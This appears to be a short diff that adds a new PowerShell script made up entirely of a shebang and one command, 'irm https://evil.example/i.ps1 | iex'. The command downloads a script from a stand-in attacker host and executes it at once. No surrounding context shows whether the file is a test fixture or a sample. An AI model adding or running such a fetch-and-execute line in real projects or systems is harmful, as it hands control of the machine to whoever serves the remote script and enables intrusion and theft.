@@ -1,0 +1,2 @@
+#!/usr/bin/env pwsh
+irm https://evil.example/i.ps1 | iex
